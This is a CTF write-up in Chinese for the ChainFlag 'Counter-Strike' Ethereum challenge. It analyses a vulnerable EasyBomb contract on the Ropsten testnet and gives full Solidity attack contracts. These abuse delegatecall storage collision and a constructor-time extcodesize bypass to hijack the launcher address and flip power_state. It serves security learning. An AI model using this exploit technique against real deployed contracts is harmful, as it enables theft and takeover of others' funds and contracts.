> 原文链接: https://www.anquanke.com//post/id/247746 


# 区块链CTF OJ平台ChainFlag -Counter-Strike Writeup


                                阅读量   
                                **19826**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01a4a3d818bb0b3373.jpg)](https://p3.ssl.qhimg.com/t01a4a3d818bb0b3373.jpg)



​ [ChainFlag](https://chainflag.org/)是一个区块链主题的CTF OJ平台，由[iczc](https://github.com/iczc) [pikachu](https://github.com/hitcxy) [PandaTea](https://github.com/PandaTea) 等师傅创建 ，目前平台还在完善中，后续会逐步添加题目，个人感觉现有题目质量很高，值得一做。这里分享下自己做题的过程。



## Counter-Strike

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"></a>题目简介

题目给了一个delegatecall的提示，以及一个链接地址，连接服务器返回如下信息

```
Welcome to Counter-Strike! You are cop now! Demolition bomb and get your flag!

 We design a pretty easy contract game. Enjoy it!
 1. Create a game account
 2. Deploy a game contract
 3. Request for flag
 4. Get source code
    Game environment: Ropsten testnet
    Option 1, get an account which will be used to deploy the contract;
    Before option 2, please transfer some eth to this account (for gas);
    Option 2, the robot will use the account to deploy the contract for the problem;
    Option 3, use this option to obtain the flag after set power_state == false.
    Option 4, use this option to get source code.
    You can finish this challenge in a lot of connections.
    [-]input your choice:
```

​ 题目的环境为Ropsten测试网络 ，其中选项一用于获得一个部署合约的账户，在向账户转移一部分ETH后，选项二将以此账户创建题目的相关合约，选项三用于在将合约中的power_state 设置为false后获取flag,选项四可以获取源码，获取源码如下：

```
pragma solidity ^0.5.10;

contract Launcher`{`
    uint256 public deadline;
    function setdeadline(uint256 _deadline) public `{``}`
`}`

contract EasyBomb`{`
    bool private hasExplode = false;
    address private launcher_address;
    bytes32 private password;
    bool public power_state = true;
    bytes4 constant launcher_start_function_hash = bytes4(keccak256("setdeadline(uint256)"));
    Launcher launcher;

    function msgPassword() public returns (bytes32 result)  `{`
        bytes memory msg_data = msg.data;
        if (msg_data.length == 0) `{`
            return 0x0;
        `}`
        assembly `{`
            result := mload(add(msg_data, add(0x20, 0x24)))
        `}`
    `}`

    modifier isOwner()`{`
        require(msgPassword() == password);
        require(msg.sender != tx.origin);
        uint x;
        assembly `{` x := extcodesize(caller) `}`
        require(x == 0);
        _;
    `}`

    modifier notExplodeYet()`{`
        launcher = Launcher(launcher_address);
        require(block.number &lt; launcher.deadline());
        hasExplode = true;
        selfdestruct(msg.sender);
        _;
    `}`

    constructor(address _launcher_address, bytes32 _fake_flag) public `{`
        launcher_address = _launcher_address;
        password = _fake_flag ;
    `}`

    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet `{`
        launcher_address.delegatecall(abi.encodeWithSignature("setdeadline(uint256)",_deadline));
    `}`
`}`
```

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

​ 题目要求我们将合约EasyBomb中的power_state全局变量变为false,首先分析源码发现合约中没有直接改变power_state变量的函数，根据提示delegatecall，我们重点关注setCountDownTimer函数。setCountDownTimer函数在满足isOwner和notExplodeYet的条件下会delegatecall调用执行launcher_address的setdeadline(uint256)函数。

​ 关于delegatecall的调用，相关的介绍文章有很多，这里只是简要介绍一下，使用delegatecall调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。相当于将外部的launcher_address合约中的setdeadline(uint256)函数拷贝到EasyBomb合约中。利用这样的规则有可能将EasyBomb合约的power_state全局变量变为false。

​ 调用的外部合约launcher_address在部署EasyBomb合约时确定，题目所给的源码中合约Launcher的setdeadline(uint256)函数没有具体内容，如果为空的话就没有啥后续的思路了，这里猜测是没有给出Launcher合约的具体源码，需要我们部署环境逆向分析查看。

​ 于是我这里按照流程创建题目环境，首先选择选项一：

```
[-]input your choice: 1
[+]Your game account:0x6C7795dF1B3f669A94d55456028F0fe385dCBee0
[+]token: 1ddOYSEmhK/seRkPvs/javUgC1t4LsD4bUix6YldXFBxgueMW8imUjZFs+zlrVf9id9gDBhcp9Z2KpqdBhznp4W7f219owMkQiCLtb7LMzhTE0psUrtc9hGmBLWCAUtsvbkCk13SsHz36N72pOCtGhd41pRSE/MJcglCJWcjaZM=
[+]Deploy will cost 117808 gas
[+]Make sure that you have enough ether to deploy!!!!!!
```

​ 这里我按照题目提示向指定账户0x6C7795dF1B3f669A94d55456028F0fe385dCBee0转了0.2eth（Ropsten 测试链可以通过测试水管免费获得eth）,然后选择选项二，输入token，获得创建合约的hash。

```
[-]input your choice: 2
[-]input your token: 1ddOYSEmhK/seRkPvs/javUgC1t4LsD4bUix6YldXFBxgueMW8imUjZFs+zlrVf9id9gDBhcp9Z2KpqdBhznp4W7f219owMkQiCLtb7LMzhTE0psUrtc9hGmBLWCAUtsvbkCk13SsHz36N72pOCtGhd41pRSE/MJcglCJWcjaZM=
[+]new token: ZxzHnKF98xMFzCH8tFd2YxtoEaN83nANz8BqvaDL2g8gF5Dz6w6I7W3odE/8oAPu/UOXPPx3zkaTose+SpIS3b8Q6zvN2Py0HPg49no42AoOxVFW72IwXC2vEclCYXpmMGwk/4ru5Ytwu94PXIjWmEMdMF3tSjQUjrHZcy4mNAhiEYzVo2TwF8hsP0Mo5nj6FIg19HMMLP3BFAtlFc4M0Q==
[+]Your goal is to set power_state into false in the game contract
[+]Transaction hash: 0x7e5348c2b4d72eecd6c2cde43b265f6cd4f63d1f858ae0da69f92c7a7eb2273c
```

​ 查看[交易](https://ropsten.etherscan.io/tx/0x7e5348c2b4d72eecd6c2cde43b265f6cd4f63d1f858ae0da69f92c7a7eb2273c) 可以发现，创建合约的账户为我们之前转账的账户0x6C7795dF1B3f669A94d55456028F0fe385dCBee0，新创建合约地址为0xe80f24f8b07f54371d43835527fe76965100ad55，查看转账账户[0x6c7795df1b3f669a94d55456028f0fe385dcbee0](https://ropsten.etherscan.io/address/0x6c7795df1b3f669a94d55456028f0fe385dcbee0)发现在创建题目环境之前还创建了一个合约0x3d8375a8840dc97e2678b95850ddcf9ab9be61c6，我们暂时不知道这个合约与题目的关联。重新回到[交易](https://ropsten.etherscan.io/tx/0x7e5348c2b4d72eecd6c2cde43b265f6cd4f63d1f858ae0da69f92c7a7eb2273c)的界面，查看Input Data，内容如下：

```
0x6080604052.......a8717cf0176ca1d650aa35b3dd70339d6564736f6c634300051000320000000000000000000000003d8375a8840dc97e2678b95850ddcf9ab9be61c6000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d
```

​ 这里省略了中间的内容为合约的具体内容，我们重点关注末尾的数据：

```
0000000000000000000000003d8375a8840dc97e2678b95850ddcf9ab9be61c6000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d
```

​ 由源码可知，合约EasyBomb的创建函数 constructor 需要两个变量输入，分别作为 _launcher_address以及 _fake_flag的值，其中 _launcher_address正是转账账户在创建题目环境之前创建的合约。除此之外，我们也可以通过获取合约EasyBomb的全局存储空间的值获取 _launcher_address的值。对 _launcher_address的合约反编译结果如下：

```
def storage:
  deadline is uint256 at storage 0

def deadline() payable: 
  return deadline

def _fallback() payable: # default function
  revert

def unknown62ff2c65(uint256 _param1) payable: 
  require calldata.size - 4 &gt;= 32
  deadline = _param1
```

​ 其中unknown62ff2c65函数就是setdeadline(uint256)，函数将storage[0]处存储的值改变为函数的参数_param1。对应到合约EasyBomb的storage[0]，就是改变了EasyBomb的全局变量hasExplode以及launcher_address，调用输入的参数是我们可以控制的变量因此可以改变delegatecall调用的合约为我们自己创建的合约，并完成我们需要的操作。为了能够顺利调用函数setCountDownTimer，需要通过两个修饰器isOwner和notExplodeYet，下面我们分析如果通过这两个函数。

```
function msgPassword() public returns (bytes32 result)  `{`
        bytes memory msg_data = msg.data;
        if (msg_data.length == 0) `{`
            return 0x0;
        `}`
        assembly `{`
            result := mload(add(msg_data, add(0x20, 0x24)))
        `}`
    `}`

    modifier isOwner()`{`
        require(msgPassword() == password);
        require(msg.sender != tx.origin);
        uint x;
        assembly `{` x := extcodesize(caller) `}`
        require(x == 0);
        _;
    `}`
```

​ 修饰器isOwner一共有三个条件，一是要求msgPassword()的返回值等同于全局变量password，二是要求消息的直接发送者不等同于交易原始的发送者，三是要求消息的直接发送者的代码段大小为0。

​ 首先看第一个要求，msgPassword()返回的是msg.data 0x44位置之后的值，msg.data就是调用合约函数时的inputdata，一般前4个字节是表示的函数名，后面是函数的参数，要满足条件需要我们构造输入数据使得0x44位置后的值为password，而password的值就是创建EasyBomb合约时的参数 _fake_flag，即0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d。

​ 第二个要求msg.sender != tx.origin，要求我们不能通过账户直接调用合约函数，可以通过构建一个合约调用函数。

​ 第三个要求直接调用者的代码长度为0，在满足第二个条件的基础上，这里要用到一个小技巧，合约创建过程中的代码长度就是0，因此我们的攻击合约需要将攻击代码放在合约的构建函数constructor中。

​ 下面是第二个修饰器notExplodeYet:

```
modifier notExplodeYet()`{`
        launcher = Launcher(launcher_address);
        require(block.number &lt; launcher.deadline());
        hasExplode = true;
        selfdestruct(msg.sender);
        _;
    `}`
```

​ 这个的修饰器需要满足合约调用函数所在的区块数低于设置的值，测试分析这个launcher.deadline()一般设置要不创建时大一定的值，所以只要在一定时间内就没有什么影响，如果创建环境时间过长那就没有办法过这个验证限制，只能通过题目的选项二重新构建环境。

​ 通过以上分析，我们研究了如何通过两个修饰器，下面我梳理一下总体的攻击思路和流程：

​ （1）构建一个攻击合约，攻击载荷放在合约的constructor函数中，构建一个攻击用Launcher合约，将setdeadline(uint256）函数实现为修改power_state所在storage的值。

​ （2）通过攻击合约调用目标合约EasyBomb的setCountDownTimer函数，通过填充数据通过修饰器的校验，将全局变量launcher_address修改为上一步构建的攻击用Launcher合约的地址。

​ （3）再次通过攻击合约调用目标合约EasyBomb的setCountDownTimer函数，触发我们构建的攻击用Launcher合约的setdeadline(uint256）函数，实现修改power_state的值。

### <a class="reference-link" name="%E5%AE%8C%E6%95%B4%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"></a>完整解题过程

​ 攻击合约代码如下：

```
contract Launcher`{`
        ......
`}`
contract EasyBomb`{`
        ......
`}`
contract Launcherhack`{`
    bool private hasExplode;
    address private launcher_address;
    bytes32 private password;
    bool public power_state;
    bytes4 constant launcher_start_function_hash = bytes4(keccak256("setdeadline(uint256)"));
    Launcher launcher;
    function setdeadline(uint256 _deadline) public `{`
        power_state = false;
    `}`
`}`
contract hackeasyboom`{`
    constructor() public `{`
        EasyBomb easyBomb = EasyBomb(0x5ac11A4ED7A810D0B0683ca70D3dF500ce969f8A);
        Launcher target = Launcher(0x6a9bE26DbcfcB597Aef8144fdE7495848de32c75);

        // target.address+00 +password 0x6a9bE26DbcfcB597Aef8144fdE7495848de32c75
         address(easyBomb).call(abi.encodeWithSignature("setCountDownTimer(uint256)",
         0x00000000000000000000006a9bE26DbcfcB597Aef8144fdE7495848de32c7500, 
         0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));
        address(easyBomb).call(abi.encodeWithSignature("setCountDownTimer(uint256)",
        0x00000000000000000000006a9bE26DbcfcB597Aef8144fdE7495848de32c7500, 
        0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));   
    `}` 
`}`
```

​ 首先创建合约Launcherhack，hackeasyboom的中的EasyBomb为题目地址，target为合约Launcherhack的地址，之后创建合约hackeasyboom完成攻击。
